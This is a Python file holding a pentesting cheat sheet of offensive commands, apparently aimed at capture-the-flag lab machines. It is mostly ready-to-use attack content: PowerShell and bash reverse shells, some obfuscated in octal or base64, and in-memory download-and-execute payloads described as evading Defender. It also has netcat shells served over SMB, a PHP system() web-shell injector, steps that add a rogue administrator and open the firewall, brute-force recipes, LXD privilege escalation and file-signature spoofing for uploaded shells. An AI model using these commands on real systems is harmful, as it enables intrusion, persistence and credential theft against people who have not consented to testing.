class Cheat:
	def __init__(self, name):
		self.name = name
		self.category = None
		self.output = None
		self.addToList()

	def addToList(self):
		global cheatList
		cheatList.append(self)


cheatList = []

######################################
######################################

PSCredential = Cheat("PSCredential")
PSCredential.category = "Windows"
PSCredential.output = """[*] Create a Credential Object for PowerShell:

$user = 'hostname\\user'
$pw = 'password'
$secure_pw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secure_pw
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
"""

######################################
######################################

icmp_reverse_shell_windows = Cheat(
	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
)
icmp_reverse_shell_windows.category = "Windows"
icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.

# 1 - Download Nishang
# 2 - Remove all blank lines and commented lines for no bugs
# 3 - Convert reverseShell File => bytes => base64
# 4 - Convert "+" and "=" symboles into "%2B" and "%3D" respectively (prevents UrlEncode errors)
# 5 - Split the long String (in base64) to small lines (80 chars) for not excede url capacity
# 6 - Send file splitted in multiples part to the target
# 7 - Decode the new file in target machine AND execute

# - 2 on kali
cat IP_icmp.ps1 | sed '/^\s*$/d' > new_IP_icmp.ps1

# - 3 on kali
pwsh
$fileContent = Get-Content -Raw ./new_IP_icmp.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Out-File new_IP_icmp.ps1.b64
exit

# - 4 on kali
cat new_IP_icmp.ps1.b64 | sed 's/+/%2B/g' | sed 's/=/%3D/g'

# - 5 on kali
fold -w 80 new_IP_icmp.ps1.b64 > final_IP_icmp.ps1.b64

# - 6 on kali
for line in $(cat icmp.ps1.b64); do cmd="echo ${line} >> C:\Temp\shell.ps1"; curl -s -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$cmd"; done

# - 7 on target machine
$file = Get-Content -Raw C:\Temp\shell.ps1
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
$decoded > C:\Temp\pwned.ps1
powershell C:\Temp\pwned.ps1
"""

######################################
######################################

check_priv_file = Cheat("Check Privilege of a file")
check_priv_file.category = "Windows"
check_priv_file.output = """[*] Check Privilege of a file like ls -lArth in Linux.
cacls C:\PATH\File.ext
"""

######################################
######################################

alternative_data_streams = Cheat(
	"Alternate Data Streams (MetaData), hide file in a file"
)
alternative_data_streams.category = "Windows"
alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)

# List all available data streams
Get-Item -Path C:\Temp\\backup.zip -stream *

# (Stdout)	    FileName: C:\Temp\backup.zip
# (Stdout)	
# (Stdout)	 Stream                   Length    
# (Stdout)	 ------                   ------
# (Stdout)	 :$DATA                   103297
# (Stdout)	 pass                         34

# Extract the data
type C:\Temp\\backup.zip:pass
"""

######################################
######################################

firewall_rules_change_to_accept_IP_Attacker = Cheat("Firewall Rules - PostExploit")
firewall_rules_change_to_accept_IP_Attacker.category = "Windows - PostExploit"
firewall_rules_change_to_accept_IP_Attacker.output = """[*] Manage Firewall and other things

# Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges) (PS)
New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.53 -Direction inbound -Action Allow

# Add permission to execute command from out of the local system (cmd)
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Open Ports (cmd)
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow

# Don't know what he do loool. But is importante... need to check...
net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
"""

######################################
######################################

evil_winrm = Cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
evil_winrm.category = "Windows"
evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials

gem install evil-winrm
evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
"""

######################################
######################################

onesixtyone = Cheat("onesixtyone - 161 UDP - Comunity string - SNMP")
onesixtyone.category = "Tools"
onesixtyone.output = """[*] Even if port 161 is filtered or pointed to closed, this tool can find out if port 161 UDP is operational.

onesixtyone 10.10.10.116
"""

######################################
######################################

snmpwalk = Cheat("snmpwalk - 161 UDP - Comunity string - SNMP")
snmpwalk.category = "Tools"
snmpwalk.output = """[*] snmpwalk - retrieve a subtree of management values using SNMP GETNEXT requests.

snmpwalk -c public -v2c 10.10.10.116 > contents/snmpwalk.out
"""

######################################
######################################

ike_scan = Cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan")
ike_scan.category = "Tools"
ike_scan.output = """[*] ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)

# ver vídeo - HackTheBox | Conceal [OSCP Style] (TWITCH LIVE)
# https://www.youtube.com/watch?v=RtztYLMZMe8&list=PLWys0ZbXYUy7GYspoUPPsGzCu1bdgUdzf&t=3187s

ike-scan 10.10.10.116 -M

# Connect to de VPN
sudo restart ipsec
"""

######################################
######################################

file_transfere_windows_iwr = Cheat(
	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
)
file_transfere_windows_iwr.category = "Windows"
file_transfere_windows_iwr.output = """[*] Simple file transfere for Windows with PowerShell

# simple download
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"

# Donwload and execute directly in RAM (Escape Windows Defender)
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
start /b C:\Windows\SysNative\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

start /b C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

# Certutil.exe
certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe

"""

######################################
######################################

create_user = Cheat("Create new local user with administrator privilege")
create_user.category = "Windows - PostExploit"
create_user.output = """[*] Create new local user with administrator privilege...

# Add a new user and assign him as Administrators group for highest local privilege
net user javali J4val1*! /add
net localgroup Administrators javali /add
"""

######################################
######################################

file_transfere_windows_smbserver = Cheat(
	"File Transfere Windows - SmbServer.py (Impacket)"
)
file_transfere_windows_smbserver.category = "Windows"
file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)

# On kali
smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support

# On target machine
# Connect to SmbServer with credencial for more compatibility and less bugs
net use \\\\10.10.14.53\smbFolder /u:javali javali
copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
# Execute directely without transfere
\\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
"""

######################################
######################################

oneline_reverse_tcp_windows = Cheat("Reverse shell TCP on Windows")
oneline_reverse_tcp_windows.category = "Windows"
oneline_reverse_tcp_windows.output = """[*] Simple one liner to get a reverse Shell TCP

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""

######################################
######################################

oracle_odat = Cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
oracle_odat.category = "Tools"
oracle_odat.output = """[*] Powerfull tool to exploit Oracle Database

# Bruteforce SID for next attacks...
odat sidguesser -s 10.10.10.82

# BruteForce default user and password in format: user/password for odat compatibility
locate oracle | grep pass
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr " " "/" > passwords.txt
sudo odat passwordguesser -s 10.10.10.82 -d <ValidSID> --accounts-file /path/to/passwords.txt

# Upload a Shell
odat utlfile -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --putFile /Temp shell.exe /path/to/shell.exe --sysdba

# RCE
odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --exec /Temp shell.exe --sysdba
"""

######################################
######################################

crackMapExec = Cheat("crackmapexec - Impacket - 445 TCP")
crackMapExec.category = "Tools"
crackMapExec.output = """[*] crackmapexec is a swiss army knife for pentesting network! 
[*] available protocols: ssh, winrm, mssql, ldap, smb

# SMB enumeration
crackmapexec smb 10.10.10.193
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt --continue-on-success | grep -vi "FAILURE"
crackmapexec smb 10.10.10.193 --shares 

# WinRM enumeration - Check if we can get Interactive shell with a valid user
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
"""

######################################
######################################

cewl = Cheat("cewl - Html to Password list")
cewl.category = "Tools"
cewl.output = """[*] Simple tool to take all word of a html page and create a file

cewl -w passwords.txt http://10.10.10.100/
cewl -w passwords.txt http://10.10.10.100/ --with-numbers
"""

######################################
######################################

smbpasswd = Cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
smbpasswd.category = "Tools"
smbpasswd.output = """[*] smbpasswd - change a user's SMB password

smbpasswd -r 10.10.10.193 -U "bhult"

"""

######################################
######################################

seLoadDriverPrivilege = Cheat("SeLoadDriverPrivilege /priv")
seLoadDriverPrivilege.category = "Windows"
seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG! 
[*] https://github.com/limitedeternity/ExploitCapcom
"""

######################################
######################################

reverseSheel = Cheat("Reverse Shell")
reverseSheel.category = "Reverse Shells"
reverseSheel.output = """[*] TCP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'
# Octal ofuscation
echo "bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'" | od -b -An | sed 's/ /\\/g' | tr -d "\n" | xclip -sel clip
printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055\151\040\046\076\057\144\145\166\057\165\144\160\057\061\060\056\061\060\056\061\064\056\065\063\057\064\064\063\040\074\046\061\047\012" | sh

# Base64 ofuscation
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash

[*] UDP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
"""

######################################
######################################

python_urlEncode = Cheat("UrlEncode - urllib - Python3")
python_urlEncode.category = "Python"
python_urlEncode.output = """[*] Convert strings into urlencoded strings for requests

# Don't forgot the " simbole can't be inputed when write cmd.
# Example: echo "test" => ERROR 404
# Example: echo 'test' => test
import urllib

	url = "http://10.10.10.27/admin.php?html="
	cmd = input("[ Fake Shell ] ")
	phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
	finalUrl = url + phpCode
"""

######################################
######################################

lxd_id = Cheat("Group LXD / Docker")
lxd_id.category = "Linux"
lxd_id.output = """[*] PrivEsc with LXD / Docker Group...

# Git clone lxd alpine builder from saghul...
git clone https://github.com/saghul/lxd-alpine-builder.git

# Build the Docker (maybe many times...) (Need to be root)
sudo ./build-alpine 
sudo ./build-alpine -a i686

# Transfere new docker to target!
sudo python3 -m http.server 80
wget http://<kali ip>:80/<alpine-name.tar.gz>

# Load the Docker and mount / for see all file with docker root privilege
# lxd init may not be available, but normally is up so... forgot it
lxd init

lxc image import ./<alpine-name.tar.gz> --alias javali
lxc init javali javali-container -c security.privileged=true
lxc config device add javali-container mydevice disk source=/ path=/mnt/root recursive=true
lxc start javali-container
lxc exec javali-container /bin/sh
"""

######################################
######################################

smbclient = Cheat("smbclient - Basics - TCP 445")
smbclient.category = "Tools"
smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers

smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas não ocultas em modo anonymous
smbclient -p 1234 \\\\\\\\10.10.10.10\\\\                  # Especifica uma porta diferente da normal (445)
smbclient \\\\\\\\10.10.10.10\\\\directory                 # Tenta entrar para a pasta "directory" do share SMB
smbclient -k \\\\\\\\10.10.10.10\\\\                       # Kerberos mode
smbclient -U USERNAME -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
smbclient -U USERNAME -P PASSWORD \\\\\\\\10.10.10.10\\\\
smbclient -W WORKGROUP \\\\\\\\10.10.10.10\\\\
"""

######################################
######################################

manualTcpScanInBash = Cheat("Manual TCP Scan in Bash")
manualTcpScanInBash.category = "Tools"
manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar

for port in $(seq 1 65355); do
	timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
done; wait
"""

######################################
######################################

hydraBasics = Cheat("hydra - Login BruteForce")
hydraBasics.category = "Tools"
hydraBasics.output = """[*] A very fast network logon cracker which supports many different services

# PRINCIPAL OPTIONS:
# 	-s PORT
# 	-l LOGIN_NAME -L LIST_LOGIN_NAMES
# 	-p PASSWORD -P LIST_PASSWORDS
# 	-C FILE (colon separated "login:pass" format, instead of -L/-P options)
# 	-o FILE (write found login/password pairs to FILE instead of stdout)
# 	-t TASKS (run TASKS number of connects in parallel (default: 16))
# 	-m OPTIONS (module specific options. See hydra -U <module> what  options  are  available.)
# 	-v / -V (verbose mode / show login+pass combination for each attempt)
# 	-f (exit after get first login:password)

export user=Admin
export pass=PaSsW0rD!
export ip=10.10.10.10

hydra -l $user -P ./passwords.txt ftp://$ip -vV -f           # FTP brute force
hydra -l $user -P ./passwords.txt $ip -t 4 ssh -vV -f        # SSH brute force
hydra -P ./passwords.txt -v $ip snmp -vV -f                  # SNMP brute force
hydra -l $user -P ./passwords.txt -f $ip pop3 -vV -f         # POP3 Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -vV -f        # SMTP Brute Force
hydra -t 1 -l $user -P ./passwords.txt $ip smb -vV -f        # SMB Brute Forcing
hydra -L users.txt -P passwords.txt $ip smb -vV -f           # SMB Brute Forcing
hydra -t 1 -l $user -P ./passwords.txt rdp://$ip -vV -f      # Hydra attack Windows Remote Desktop
hydra -L users.txt -P passwords.txt $ip ldap2 -vV -f	     # LDAP Brute Forcing
hydra -L ./users.txt -P ./passwords.txt $ip http-get /admin  # attack http get 401 login with a dictionary

# Post Web Form
hydra -l $user -P ./passwordlist.txt $ip http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
hydra -l $user -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# Get form popup login
hydra -l $user -P ./passwordlist.txt $ip http-get /dir/
"""

######################################
######################################

wgetRecursive = Cheat("wget Recursive")
wgetRecursive.category = "Tools"
wgetRecursive.output = """[*] Download recursively all file from simple server via url

# -np (no-parent) -R "string" (remove files with string name... wilcards works)
wget -r http://10.10.10.75/nibbleblog/content/ -np -R "index.html*" 
"""

######################################
######################################

wpscan = Cheat("wpscan - wordpress")
wpscan.category = "Tools"
wpscan.output = """[*] WPScan - WordPress Security Scanner

wpscan --url www.website.com              # Non-intrusive scan
	-t 50                                 # Force 50 threads
	--cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
	--wp-content-dir /DIR                 # Specific correct /path when is not the default
	--wp-plugins-dir /DIR                 # Specific correct /path when is not the default
	--enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
										  #                ap (All plugins),
										  #                p (Plugins),
										  #                vt (Vulnerable themes),
										  #                at (All themes),
										  #                t (Themes),
										  #                tt (Timthumbs),
										  #                cb (Config backups),
										  #                u (User IDs)
										  # Format: [choice],[choice],[choice],...
	-P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
	-U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
	--update                              # Update database

# Examples:
wpscan --url www.website.com
wpscan --url www.website.com --passwords /path/wordlist.txt -t 50
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-content-dir custom-content
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-plugins-dir wp-content/custom-plugins
"""

######################################
######################################

mimeChanger = Cheat("Change MIME Type of file")
mimeChanger.category = "Tools"
mimeChanger.output = """[*] Change MIME Type of file...

# https://en.wikipedia.org/wiki/List_of_file_signatures
# This methode will overwrite first bytes...

xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg

"""
